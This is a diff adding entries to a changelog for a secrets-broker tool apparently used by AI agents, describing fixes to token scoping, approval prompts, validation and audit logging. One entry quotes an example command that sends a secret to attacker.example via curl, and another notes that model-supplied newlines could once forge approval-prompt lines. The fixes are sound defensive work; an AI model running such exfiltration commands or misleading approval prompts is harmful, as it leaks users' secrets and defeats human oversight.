@@ -76,6 +76,36 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   `net/http`, `net/textproto`, `crypto/tls` and `html/template`
   (GO-2026-6599 through GO-2026-6617), and govulncheck finds them
   reachable from the proxy, OAuth and 1Password Connect code paths.
+- A token's `for` scope is now enforced. `mint_token` has always accepted
+  `for` ("Command pattern this token is for") and `list_tokens` shows it,
+  but nothing ever checked it: a token minted `for: gh` was accepted by
+  `exec` and `exec_with_secrets` for any command, and by the GitHub
+  integration tools. The pattern is now matched against the command's
+  base name the same way policy rules are, and a mismatch is rejected
+  with `token invalid: wrong_command`, naming the token's pattern and
+  the command, without consuming a use. Tokens minted with the default
+  `*`, including auto-minted session tokens, behave exactly as before.
+  **Behaviour change for scoped tokens:** the GitHub integration tools
+  are checked as `nokey:integration:github`, so a token minted
+  `for: gh` that used to work with `github_api` and the other `github_*`
+  tools is now refused. Mint it `for: nokey:integration:github` (or
+  `*`) instead.
+- Approval prompts now show what is being approved, not just a command
+  name. `exec` and `exec_with_secrets` list the arguments (quoted, with
+  `${{NOKEY:…}}` placeholders shown unresolved, capped at 512 bytes), so
+  `curl https://attacker.example -H "X: ${{NOKEY:KEY}}"` no longer reads
+  as a plain "curl wants KEY". `mint_token` shows the requested `for`,
+  TTL and max uses, the auto-minted session token is described as
+  "unlimited uses, 1h, any command", and integration tools show the
+  request method, path and body. Every model-supplied value in a prompt is
+  quoted and capped, so a newline in it can't forge a line of the
+  prompt.
+- `mint_token` validates the TTL, `max_uses`, the `for` pattern and that
+  every named secret exists before prompting, and `exec_with_secrets`
+  checks its placeholder secrets exist before prompting, so the user is
+  never asked to approve a request that is going to fail.
+- `revoke_token` records a short SHA-256 fingerprint of the token ID in
+  the audit log instead of the ID itself.
 
 ### Added
 - `nokey import --dry-run FILE` parses the file and lists the secret
